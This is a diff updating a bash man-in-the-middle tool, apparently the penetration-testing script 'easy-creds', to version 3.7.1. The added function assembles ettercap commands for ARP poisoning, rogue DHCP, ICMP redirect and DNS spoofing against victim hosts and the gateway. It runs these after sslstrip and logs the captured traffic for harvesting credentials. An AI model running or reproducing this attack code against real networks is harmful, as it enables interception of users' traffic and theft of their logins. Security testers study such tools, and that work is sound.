@@ -5,7 +5,7 @@
 #                                                                                                                #
 # J0hnnyBrav0 (@Brav0hax) & help from al14s (@al14s)                                                             #
 ##################################################################################################################
-# v3.7 Garden of Your Mind- 10/30/2012
+# v3.7.1 Garden of Your Mind - 11/01/2012
 #
 # Copyright (C) 2012  Eric Milam
 # This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public 
@@ -32,6 +32,9 @@ unset y
 
 #Save the starting location path
 location=$PWD
+
+#Find the ettercap version. Will be used for f_whichetter
+ettercapversion=$(ettercap -v|grep 2012|grep -o "0.7.5")
 
 #Create the log folder in PWD
 if [ -z $1 ]; then
@@ -148,7 +151,7 @@ f_checkexit(){
 	if [ -z $clean ]; then
 		f_Quit
 	else
-		rm -rf /tmp/ec
+		rm -rf /tmp/ec &> /dev/null
 		clear
 		exit 2> /dev/null
 	fi
@@ -274,7 +277,7 @@ f_dhcp3install(){
 
 	echo -e "\e[1;33m[*] Installing dhcp3-server, please stand by.\e[0m\n"
 	if [ -e /etc/lsb-release ] || [ -e /etc/issue ]; then
-	 apt-get update && apt-get install dhcp3-server &> /dev/null
+	 apt-get update &> /dev/null && apt-get install dhcp3-server -y &> /dev/null
 	elif [ -e /etc/redhat-release ]; then
 	 yum install dhcp* &> /dev/null
 	else
@@ -623,6 +626,42 @@ f_ecap(){
 
 
 ##################################################
+f_ecap_assimilation(){
+	#Used if version of ettercap is 0.7.5 and above. Target specification format changed for IPv6
+	
+	echo -e "\n\e[1;33m[*] Launching ettercap, poisoning specified hosts.\e[0m\n"
+	y=$(($y+$yoffset))
+
+	case $etterlaunch in
+	1) type="[arp:remote]"
+	   c="ettercap -a /etc/etter.conf -M arp:remote -T -j $VICLIST -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE /$GW// ///" ;;
+	2) type="[arp:remote]"
+	   c="ettercap -a /etc/etter.conf -M arp:remote -T -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE /$GW// /$VICS//" ;;
+	3) type="[arp:oneway]"
+	   c="ettercap -a /etc/etter.conf -M arp:oneway -T -j $VICLIST -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE /// /$GW//" ;;
+	4) type="[arp:oneway]"
+	   c="ettercap -a /etc/etter.conf -M arp:oneway -T -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE /$VICS// /$GW//" ;;
+	5) type="[dhcp:$POOL/$MASK/$DNS/]"
+	   c="ettercap -a /etc/etter.conf -T -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE -M dhcp:$POOL/$MASK/$DNS/" ;;
+	6) type="[icmp:$GATEMAC/$GATEIP]"
+	   c="ettercap -a /etc/etter.conf -T -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE -M icmp:$GATEMAC/$GATEIP" ;;
+	7) type="[tunnel]"
+	   c="ettercap -a /etc/etter.conf -T -q -l $logfldr/ettercap$(date +%F-%H%M) -i $TUNIFACE /// ///" ;;
+	8) type="[dns_spoof / arp]"
+	   c="ettercap -a /etc/etter.conf -P dns_spoof -M arp -T -j $VICLIST -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE /$GW// ///" ;;
+	9) type="[dns_spoof / arp]"
+	   c="ettercap -a /etc/etter.conf -P dns_spoof -M arp -T -q -l $logfldr/ettercap$(date +%F-%H%M) -i $IFACE /$GW// /$VICS//" ;;
+	esac
+
+	if [ ! -z $isxrunning ]; then
+	   xterm -geometry "$width"x$height-$x+$y -T "Ettercap - $type" -l -lf $logfldr/ettercap$(date +%F-%H%M).txt -bg white -fg black -e $c &
+	else
+	   screen -S easy-creds -t ettercap -X screen $c
+	fi
+	ecpid=$(pidof ettercap)
+}
+
+##################################################
 #
 # FAKE AP ATTACK FUNCTIONS
 #
@@ -847,7 +886,13 @@ f_finalstage(){
 	fi
 	echo $! > /tmp/ec/sslstrip.pid
 	sleep 2
-	f_ecap
+	
+	if [ -z "$ettercapversion" ]; then
+		f_ecap
+	else
+		f_ecap_assimilation
+	fi
+	
 	sleep 1
 
 	echo -e "\n\e[1;33m[*] Configuring IP forwarding...\e[0m\n"
@@ -1480,7 +1525,7 @@ f_dsniff(){
 	fi
 
 	DSNIFFPATH=
-	while [ -z $DSNIFFPATH ] && [ ! -f "$DSNIFFPATH" ]; do
+	while [ -z $DSNIFFPATH ] || [ ! -f "$DSNIFFPATH" ]; do
 	 read -e -p "Enter the path for your dsniff Log file: " DSNIFFPATH
 	done
 
@@ -1564,7 +1609,7 @@ f_Banner(){
 	echo -e "||\e[1;36me\e[0m |||\e[1;36ma\e[0m |||\e[1;36ms\e[0m |||\e[1;36my\e[0m |||\e[1;36m-\e[0m |||\e[1;36mc\e[0m |||\e[1;36mr\e[0m |||\e[1;36me\e[0m |||\e[1;36md\e[0m |||\e[1;36ms\e[0m ||"
 	echo -e "||__|||__|||__|||__|||__|||__|||__|||__|||__|||__||"
 	echo -e "|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|"
-	echo -e "\e[1;33m 	Version 3.7 - Garden of Your Mind\e[0m"
+	echo -e "\e[1;33m 	Version 3.7.1 - Garden of Your Mind\e[0m"
 	echo
 	echo -e "\e[1;33mAt any time,\e[0m \e[1;36mctrl+c\e[0m \e[1;33m to cancel and return to the main menu\e[0m"
 	echo
